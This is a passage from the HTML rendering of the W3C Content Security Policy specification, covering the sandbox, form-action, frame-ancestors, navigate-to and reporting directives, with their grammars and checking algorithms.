  contains either the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-scripts-browsing-context-flag" id="ref-for-sandboxed-scripts-browsing-context-flag">sandboxed scripts browsing context flag</a> or
  the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-origin-browsing-context-flag" id="ref-for-sandboxed-origin-browsing-context-flag">sandboxed origin browsing context flag</a> flags, return
  "<code>Blocked</code>".</p>
        <p class="note" role="note"><span class="marker">Note:</span> This will need to change if we allow Workers to be sandboxed into
  unique origins, which seems like a pretty reasonable thing to do.</p>
      </ol>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="sandbox Initialization" data-level="6.2.2.2" id="sandbox-init"><span class="secno">6.2.2.2. </span><span class="content"> <code>sandbox</code> Initialization </span><a class="self-link" href="#sandbox-init"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-initialization" id="ref-for-directive-initialization②">initialization</a> algorithm is
  responsible for adjusting a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⑤">Document</a></code>'s <a data-link-type="dfn">forced sandboxing flag set</a> according to the <a data-link-type="dfn" href="#sandbox" id="ref-for-sandbox"><code>sandbox</code></a> values present in its policies, as
  follows:</p>
    <p>Given a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⑥">Document</a></code> or <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object①⑤">global object</a> (<var>context</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③⑥">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦⓪">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p class="assertion">Assert: <var>response</var> is unused.</p>
     <li data-md>
      <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition②⓪">disposition</a> is not "<code>enforce</code>", or <var>context</var> is not a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⑦">Document</a></code>, then abort this algorithm.</p>
      <p class="note" role="note"><span class="marker">Note:</span> This will need to change if we allow Workers to be sandboxed,
  which seems like a pretty reasonable thing to do.</p>
     <li data-md>
      <p><a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#parse-a-sandboxing-directive" id="ref-for-parse-a-sandboxing-directive①">Parse a sandboxing directive</a> using this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④⑥">value</a> as the input, and <var>context</var>’s <a data-link-type="dfn">forced
  sandboxing flag set</a> as the output.</p>
    </ol>
    <h3 class="heading settled" data-level="6.3" id="directives-navigation"><span class="secno">6.3. </span><span class="content"> Navigation Directives </span><a class="self-link" href="#directives-navigation"></a></h3>
    <h4 class="heading settled" data-level="6.3.1" id="directive-form-action"><span class="secno">6.3.1. </span><span class="content"><code>form-action</code></span><a class="self-link" href="#directive-form-action"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="form-action">form-action</dfn> directive restricts the <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑥">URL</a></code>s which can be used
  as the target of a form submissions from a given context. The directive’s syntax is
  described by the following ABNF grammar:</p>
<pre class="abnf">directive-name  = "form-action"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⑧">serialized-source-list</a>
</pre>
    <h5 class="heading settled algorithm" data-algorithm="form-action Pre-Navigation Check" data-level="6.3.1.1" id="form-action-pre-navigate"><span class="secno">6.3.1.1. </span><span class="content"> <code>form-action</code> Pre-Navigation Check </span><a class="self-link" href="#form-action-pre-navigate"></a></h5>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤⑤">request</a> (<var>request</var>), a string <var>navigation type</var> ("<code>form-submission</code>" or
  "<code>other</code>"), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦①">policy</a> (<var>policy</var>) this algorithm returns "<code>Blocked</code>" if a form
  submission violates the <code>form-action</code> directive’s constraints, and "<code>Allowed</code>"
  otherwise. This constitutes the <code>form-action</code> directive’s <a data-link-type="dfn" href="#directive-pre-navigation-check" id="ref-for-directive-pre-navigation-check①">pre-navigation check</a>:</p>
    <ol class="algorithm">
     <li data-md>
      <p class="assertion">Assert: <var>policy</var> is unused in this algorithm.</p>
     <li data-md>
      <p>If <var>navigation type</var> is "<code>form-submission</code>":</p>
      <ol>
       <li data-md>
        <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④⑦">value</a>, and a <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
      </ol>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.3.2" id="directive-frame-ancestors"><span class="secno">6.3.2. </span><span class="content"><code>frame-ancestors</code></span><a class="self-link" href="#directive-frame-ancestors"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="frame-ancestors">frame-ancestors</dfn> directive restricts the <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑦">URL</a></code>s which can
  embed the resource using <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/obsolete.html#frame" id="ref-for-frame②">frame</a></code>, <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element④">iframe</a></code>, <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element④">object</a></code>, or <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element" id="ref-for-the-embed-element②">embed</a></code>. Resources
  can use this directive to avoid many UI Redressing <a data-link-type="biblio" href="#biblio-uisecurity" title="User Interface Security and the Visibility API">[UISECURITY]</a> attacks, by
  avoiding the risk of being embedded into potentially hostile contexts.</p>
    <p>The directive’s syntax is described by the following ABNF grammar:</p>
<pre>directive-name  = "frame-ancestors"
directive-value = <a data-link-type="grammar" href="#grammardef-ancestor-source-list" id="ref-for-grammardef-ancestor-source-list">ancestor-source-list</a>

<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-ancestor-source-list">ancestor-source-list</dfn> = ( <a data-link-type="grammar" href="#grammardef-ancestor-source" id="ref-for-grammardef-ancestor-source">ancestor-source</a> *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace④">required-ascii-whitespace</a> <a data-link-type="grammar" href="#grammardef-ancestor-source" id="ref-for-grammardef-ancestor-source①">ancestor-source</a>) ) / "<a data-link-type="grammar" href="#grammardef-none" id="ref-for-grammardef-none①">'none'</a>"
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-ancestor-source">ancestor-source</dfn>      = <a data-link-type="grammar" href="#grammardef-scheme-source" id="ref-for-grammardef-scheme-source①">scheme-source</a> / <a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source①">host-source</a> / "<a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self③③">'self'</a>"
</pre>
    <p>The <code>frame-ancestors</code> directive MUST be ignored when contained in a policy
  declared via a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta①①">meta</a></code> element.</p>
    <p class="note" role="note"><span class="marker">Note:</span> The <code>frame-ancestors</code> directive’s syntax is similar to a <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①①">source
  list</a>, but <code>frame-ancestors</code> will not fall back to the <code>default-src</code> directive’s value if one is specified. That is, a policy that declares <code>default-src 'none'</code> will still allow the resource to be embedded by anyone.</p>
    <h5 class="heading settled algorithm" data-algorithm="frame-ancestors Navigation Response Check" data-level="6.3.2.1" id="frame-ancestors-navigation-response"><span class="secno">6.3.2.1. </span><span class="content"> <code>frame-ancestors</code> Navigation Response Check </span><a class="self-link" href="#frame-ancestors-navigation-response"></a></h5>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤⑥">request</a> (<var>request</var>), a string <var>navigation type</var> ("<code>form-submission</code>" or "<code>other</code>"), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③⑦">response</a> (<var>navigation response</var>) a <a data-link-type="dfn" href="https://html.spec.whatwg.org/#browsing-context" id="ref-for-browsing-context③">browsing context</a> (<var>target</var>),
  a string <var>check type</var> ("<code>source</code>" or "<code>response</code>"), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦②">policy</a> (<var>policy</var>) this algorithm returns "<code>Blocked</code>" if one or
  more of the ancestors of <var>target</var> violate the <code>frame-ancestors</code> directive
  delivered with the response, and "<code>Allowed</code>" otherwise. This constitutes the <code>frame-ancestors</code> directive’s <a data-link-type="dfn" href="#directive-navigation-response-check" id="ref-for-directive-navigation-response-check②">navigation response check</a>:</p>
    <ol class="algorithm">
     <li data-md>
      <p class="assertion">Assert: <var>request</var>, <var>navigation response</var>, and <var>navigation type</var>, are
  unused in this algorithm, as <code>frame-ancestors</code> is concerned only
  with <var>navigation response</var>’s <a data-link-type="dfn" href="#frame-ancestors" id="ref-for-frame-ancestors①">frame-ancestors</a> <a data-link-type="dfn" href="#directives" id="ref-for-directives②②">directive</a>.</p>
     <li data-md>
      <p>If <var>check type</var> is "<code>source</code>", return "<code>Allowed</code>".</p>
      <p class="note" role="note"><span class="marker">Note:</span> The 'frame-ancestors' <a data-link-type="dfn" href="#directives" id="ref-for-directives②③">directive</a> is relevant only to the <var>target</var> <a data-link-type="dfn" href="https://html.spec.whatwg.org/#browsing-context" id="ref-for-browsing-context④">browsing context</a> and it has no impact on the <var>request</var>’s
  context.</p>
     <li data-md>
      <p>If <var>target</var> is not a <a data-link-type="dfn">nested browsing context</a>, return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Let <var>current</var> be <var>target</var>.</p>
     <li data-md>
      <p>While <var>current</var> is a <a data-link-type="dfn">nested browsing context</a>:</p>
      <ol>
       <li data-md>
        <p>Let <var>document</var> be <var>current</var>’s <a data-link-type="dfn">container document</a>.</p>
       <li data-md>
        <p>Let <var>origin</var> be the result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-parser" id="ref-for-concept-url-parser①">URL parser</a> on the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#ascii-serialisation-of-an-origin" id="ref-for-ascii-serialisation-of-an-origin">ASCII serialization</a> of <var>document</var>’s <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-document-origin" id="ref-for-concept-document-origin">origin</a>.</p>
       <li data-md>
        <p>If <a href="#match-url-to-source-list">§ 6.6.2.5 Does url match source list in origin with redirect count?</a> returns <code>Does Not Match</code> when
  executed upon <var>origin</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④⑧">value</a>, <var>policy</var>’s <a data-link-type="dfn" href="#policy-self-origin" id="ref-for-policy-self-origin③">self-origin</a>, and <code>0</code>, return "<code>Blocked</code>".</p>
       <li data-md>
        <p>Set <var>current</var> to <var>document</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/#browsing-context" id="ref-for-browsing-context⑤">browsing context</a>.</p>
      </ol>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled" data-level="6.3.2.2" id="frame-ancestors-and-frame-options"><span class="secno">6.3.2.2. </span><span class="content"> Relation to <code>X-Frame-Options</code> </span><a class="self-link" href="#frame-ancestors-and-frame-options"></a></h5>
    <p>This directive is similar to the <code>X-Frame-Options</code> header that several user agents have
  implemented. The <code>'none'</code> source expression is roughly equivalent to that header’s <code>DENY</code>, <code>'self'</code> to <code>SAMEORIGIN</code>, and so on. The major difference is that many user agents implement <code>SAMEORIGIN</code> such that it only matches against the top-level document’s location, while
  the <a data-link-type="dfn" href="#frame-ancestors" id="ref-for-frame-ancestors②"><code>frame-ancestors</code></a> directive checks against each ancestor. If _any_ ancestor doesn’t
  match, the load is cancelled. <a data-link-type="biblio" href="#biblio-rfc7034" title="HTTP Header Field X-Frame-Options">[RFC7034]</a></p>
    <p>In order to allow backwards-compatible deployment, the <a data-link-type="dfn" href="#frame-ancestors" id="ref-for-frame-ancestors③"><code>frame-ancestors</code></a> directive
  _obsoletes_ the <code>X-Frame-Options</code> header. If a resource is delivered with an <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦③">policy</a> that includes a <a data-link-type="dfn" href="#directives" id="ref-for-directives②④">directive</a> named <a data-link-type="dfn" href="#frame-ancestors" id="ref-for-frame-ancestors④"><code>frame-ancestors</code></a> and whose <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition②①">disposition</a> is "<code>enforce</code>", then the <code>X-Frame-Options</code> header MUST be ignored.</p>
    <p class="issue" id="issue-c6a38617"><a class="self-link" href="#issue-c6a38617"></a> Spell this out in more detail as part of defining <code>X-Frame-Options</code> integration with the <a data-link-type="dfn">process a navigate response</a> algorithm. <a href="https://github.com/whatwg/html/issues/1230">[Issue #whatwg/html#1230]</a></p>
    <h4 class="heading settled" data-level="6.3.3" id="directive-navigate-to"><span class="secno">6.3.3. </span><span class="content"><code>navigate-to</code></span><a class="self-link" href="#directive-navigate-to"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="navigate-to">navigate-to</dfn> directive restricts the <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑧">URL</a></code>s to which
  a <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-document" id="ref-for-concept-document">document</a> can initiate navigations by any means (<code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element" id="ref-for-the-a-element①">a</a></code>, <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/forms.html#the-form-element" id="ref-for-the-form-element">form</a></code>, <code>window.location</code>, <code>window.open</code>, etc.). This is an enforcement on what navigations this <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-document" id="ref-for-concept-document①">document</a> initiates <code>not</code> on what this <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-document" id="ref-for-concept-document②">document</a> is allowed to navigate to.
  If the <a data-link-type="dfn" href="#form-action" id="ref-for-form-action">form-action</a> directive is present, the <a data-link-type="dfn" href="#navigate-to" id="ref-for-navigate-to②">navigate-to</a> directive
  will not act on navigations that are form submissions.</p>
    <div class="example" id="example-118c27cf">
     <a class="self-link" href="#example-118c27cf"></a> A <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-document" id="ref-for-concept-document③">document</a> <var>initiator</var> has the following <code>Content-Security-Policy</code>: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑦">Content-Security-Policy</a>: navigate-to example.com
</pre>
     <p>A <a data-link-type="dfn" href="https://dom.spec.whatwg.org/#concept-document" id="ref-for-concept-document④">document</a> <var>target</var> has the following <code>Content-Security-Policy</code>:</p>
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑧">Content-Security-Policy</a>: navigate-to not-example.com
</pre>
     <p>If the <var>initiator</var> attempts to navigate the <var>target</var> to <code>example.com</code>, the
    navigation is allowed by the <code>navigate-to</code> directive.</p>
     <p>If the <var>initiator</var> attempts to navigate the <var>target</var> to <code>not-example.com</code>,
    the navigation is blocked by the <code>navigate-to</code> directive.</p>
    </div>
    <p>The directive’s syntax is described by the following ABNF grammar:</p>
<pre class="abnf">directive-name  = "navigate-to"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⑨">serialized-source-list</a>
</pre>
    <h5 class="heading settled algorithm" data-algorithm="navigate-to Pre-Navigation Check" data-level="6.3.3.1" id="navigate-to-pre-navigate"><span class="secno">6.3.3.1. </span><span class="content"> <code>navigate-to</code> Pre-Navigation Check </span><a class="self-link" href="#navigate-to-pre-navigate"></a></h5>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤⑦">request</a> (<var>request</var>), a string <var>navigation type</var> ("<code>form-submission</code>" or
  "<code>other</code>"), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦④">policy</a> (<var>policy</var>), this algorithm returns "<code>Blocked</code>"
  if the navigation violates the <code>navigate-to</code> directive’s constraints, and
  "<code>Allowed</code>" otherwise. This constitutes the <code>navigate-to</code>' directive’s <a data-link-type="dfn" href="#directive-pre-navigation-check" id="ref-for-directive-pre-navigation-check②">pre-navigation check</a>:</p>
    <ol class="algorithm">
     <li data-md>
      <p>If <var>navigation type</var> is "<code>form-submission</code>" and <var>policy</var> contains a <a data-link-type="dfn" href="#directives" id="ref-for-directives②⑤">directive</a> named "<code>form-action</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④⑨">value</a> contains a <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression③">source
  expression</a> that is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive②">ASCII case-insensitive</a> match for
  the "<a data-link-type="grammar" href="#grammardef-unsafe-allow-redirects" id="ref-for-grammardef-unsafe-allow-redirects"><code>'unsafe-allow-redirects'</code></a>" <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source①">keyword-source</a>, return "<code>Allowed</code>".</p>
      <p class="note" role="note"><span class="marker">Note:</span> If the 'unsafe-allow-redirects' flag is present we have to
  wait for the <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③⑧">response</a> and take into account the <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③⑨">response</a>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-status" id="ref-for-concept-response-status">status</a> in <a href="#navigate-to-navigation-response">§ 6.3.3.2 navigate-to Navigation Response Check</a>.</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤⓪">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="navigate-to Navigation Response Check" data-level="6.3.3.2" id="navigate-to-navigation-response"><span class="secno">6.3.3.2. </span><span class="content"> <code>navigate-to</code> Navigation Response Check </span><a class="self-link" href="#navigate-to-navigation-response"></a></h5>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤⑧">request</a> (<var>request</var>), a string <var>navigation type</var> ("<code>form-submission</code>" or "<code>other</code>"), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response④⓪">response</a> (<var>navigation response</var>)
  a <a data-link-type="dfn" href="https://html.spec.whatwg.org/#browsing-context" id="ref-for-browsing-context⑥">browsing context</a> (<var>target</var>), a string <var>check type</var> ("<code>source</code>" or "<code>response</code>"), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦⑤">policy</a> (<var>policy</var>), this
  algorithm returns "<code>Blocked</code>" if the navigation violates the <code>navigate-to</code> directive’s constraints, and "<code>Allowed</code>" otherwise. This constitutes the <code>navigate-to</code> directive’s <a data-link-type="dfn" href="#directive-navigation-response-check" id="ref-for-directive-navigation-response-check③">navigation response check</a>:</p>
    <ol class="algorithm">
     <li data-md>
      <p class="assertion">Assert: <var>target</var> is unused.</p>
     <li data-md>
      <p>If <var>check type</var> is "<code>response</code>", return "<code>Allowed</code>".</p>
      <p class="note" role="note"><span class="marker">Note:</span> The 'navigate-to' <a data-link-type="dfn" href="#directives" id="ref-for-directives②⑥">directive</a> is relevant only to the <var>request</var>’s context and it has no impact on the <var>target</var> <a data-link-type="dfn" href="https://html.spec.whatwg.org/#browsing-context" id="ref-for-browsing-context⑦">browsing context</a>.</p>
     <li data-md>
      <p>If <var>navigation type</var> is "<code>form-submission</code>" and <var>policy</var> contains a <a data-link-type="dfn" href="#directives" id="ref-for-directives②⑦">directive</a> named "<code>form-action</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤①">value</a> does not contain a <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression④">source
  expression</a> that is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive③">ASCII case-insensitive</a> match for
  the "<a data-link-type="grammar" href="#grammardef-unsafe-allow-redirects" id="ref-for-grammardef-unsafe-allow-redirects①"><code>'unsafe-allow-redirects'</code></a>" <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source②">keyword-source</a>, return "<code>Allowed</code>".</p>
      <p class="note" role="note"><span class="marker">Note:</span> If the 'unsafe-allow-redirects' flag is not present we have
  already checked the navigation in <a href="#navigate-to-pre-navigate">§ 6.3.3.1 navigate-to Pre-Navigation Check</a>.</p>
     <li data-md>
      <p>If <var>navigation response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-status" id="ref-for-concept-response-status①">status</a> is a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#redirect-status" id="ref-for-redirect-status">redirect status</a>, return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤②">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h3 class="heading settled" data-level="6.4" id="directives-reporting"><span class="secno">6.4. </span><span class="content"> Reporting Directives </span><a class="self-link" href="#directives-reporting"></a></h3>
    <p>Various algorithms in this document hook into the reporting process by
  constructing a <a data-link-type="dfn" href="#violation" id="ref-for-violation①⑨">violation</a> object via <a href="#create-violation-for-request">§ 2.4.2 Create a violation object for request, and policy.</a> or <a href="#create-violation-for-global">§ 2.4.1 Create a violation object for global, policy, and directive</a>, and passing that object to <a href="#report-violation">§ 5.3 Report a violation</a> to deliver the report.</p>
    <h4 class="heading settled" data-level="6.4.1" id="directive-report-uri"><span class="secno">6.4.1. </span><span class="content"><code>report-uri</code></span><a class="self-link" href="#directive-report-uri"></a></h4>
    <div class="note" role="note">
      Note: The <a data-link-type="dfn" href="#report-uri" id="ref-for-report-uri②"><code>report-uri</code></a> directive is deprecated. Please use the <a data-link-type="dfn" href="#report-to" id="ref-for-report-to③"><code>report-to</code></a> directive instead. If the latter directive is present,
    this directive will be ignored. To ensure backwards compatibility, we
    suggest specifying both, like this: 
     <div class="example" id="example-0ac8d9c4">
      <a class="self-link" href="#example-0ac8d9c4"></a> 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑨">Content-Security-Policy</a>: ...; <a data-link-type="dfn" href="#report-uri" id="ref-for-report-uri③">report-uri</a> https://endpoint.com; <a data-link-type="dfn" href="#report-to" id="ref-for-report-to④">report-to</a> groupname
</pre>
     </div>
    </div>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="report-uri"><code>report-uri</code></dfn> directive defines a set of endpoints to which <a data-link-type="dfn" href="#csp-violation-report" id="ref-for-csp-violation-report②">csp violation reports</a> will be sent when particular behaviors are prevented.</p>
<pre>directive-name  = "report-uri"
directive-value = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-4.1" id="ref-for-section-4.1">uri-reference</a> *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace⑤">required-ascii-whitespace</a> <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-4.1" id="ref-for-section-4.1①">uri-reference</a> )

; The <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc3986#section-4.1" id="ref-for-section-4.1②">uri-reference</a> grammar is defined in Section 4.1 of RFC 3986.
</pre>
    <p>The directive has no effect in and of itself, but only gains meaning in
  combination with other directives.</p>
    <h4 class="heading settled" data-level="6.4.2" id="directive-report-to"><span class="secno">6.4.2. </span><span class="content"><code>report-to</code></span><a class="self-link" href="#directive-report-to"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="report-to"><code>report-to</code></dfn> directive defines a <a data-link-type="dfn" href="https://w3c.github.io/reporting/#group" id="ref-for-group">reporting
  group</a> to which violation reports ought to be sent <a data-link-type="biblio" href="#biblio-reporting" title="Reporting API">[REPORTING]</a>. The
  directive’s behavior is defined in <a href="#report-violation">§ 5.3 Report a violation</a>. The directive’s name
  and value are described by the following ABNF:</p>
<pre>directive-name  = "report-to"
directive-value = <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc7230#section-3.2.6" id="ref-for-section-3.2.6②">token</a>
</pre>
    <h3 class="heading settled" data-level="6.5" id="directives-elsewhere"><span class="secno">6.5. </span><span class="content"> Directives Defined in Other Documents </span><a class="self-link" href="#directives-elsewhere"></a></h3>
    <p>This document defines a core set of directives, and sets up a framework for
  modular extension by other specifications. At the time this document was
  produced, the following stable documents extend CSP:</p>
    <ul>
     <li data-md>
      <p><a data-link-type="biblio" href="#biblio-mix" title="Mixed Content">[MIX]</a> defines <code>block-all-mixed-content</code></p>
     <li data-md>
      <p><a data-link-type="biblio" href="#biblio-upgrade-insecure-requests" title="Upgrade Insecure Requests">[UPGRADE-INSECURE-REQUESTS]</a> defines <code>upgrade-insecure-requests</code></p>
    </ul>
    <p>Extensions to CSP MUST register themselves via the process outlined in <a data-link-type="biblio" href="#biblio-rfc7762" title="Initial Assignment for the Content Security Policy Directives Registry">[RFC7762]</a>. In particular, note the criteria discussed in Section 4.2 of
  that document.</p>
    <p>New directives SHOULD use the <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①⑧">pre-request check</a>, <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①⑨">post-request check</a>, <a data-link-type="dfn" href="#directive-response-check" id="ref-for-directive-response-check③">response
  check</a>, and <a data-link-type="dfn" href="#directive-initialization" id="ref-for-directive-initialization③">initialization</a> hooks in order to
  integrate themselves into Fetch and HTML.</p>
    <h3 class="heading settled" data-level="6.6" id="matching-algorithms"><span class="secno">6.6. </span><span class="content">Matching Algorithms</span><a class="self-link" href="#matching-algorithms"></a></h3>
    <h4 class="heading settled" data-level="6.6.1" id="script-checks"><span class="secno">6.6.1. </span><span class="content">Script directive checks</span><a class="self-link" href="#script-checks"></a></h4>
    <h5 class="heading settled algorithm" data-algorithm="Script directives pre-request check" data-level="6.6.1.1" id="script-pre-request"><span class="secno">6.6.1.1. </span><span class="content"> Script directives pre-request check </span><a class="self-link" href="#script-pre-request"></a></h5>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤⑨">request</a> (<var>request</var>), a <a data-link-type="dfn" href="#directives" id="ref-for-directives②⑧">directive</a> (<var>directive</var>),
  and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦⑥">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>If <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination" id="ref-for-concept-request-destination⑤">destination</a> is <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#request-destination-script-like" id="ref-for-request-destination-script-like①">script-like</a>:</p>
      <ol>
       <li data-md>
        <p>If the result of executing <a href="#match-nonce-to-source-list">§ 6.6.2.2 Does nonce match source list?</a> on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata" id="ref-for-concept-request-nonce-metadata⑤">cryptographic nonce metadata</a> and this
  directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤③">value</a> is "<code>Matches</code>", return
  "<code>Allowed</code>".</p>
       <li data-md>
        <p>Let <var>integrity expressions</var> be the set of <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑤">source expressions</a> in <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤④">value</a> that match the <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source④">hash-source</a> grammar.</p>
       <li data-md>
        <p>If <var>integrity expressions</var> is not empty:</p>
        <ol>
         <li data-md>
          <p>Let <var>integrity sources</var> be the result of executing the algorithm
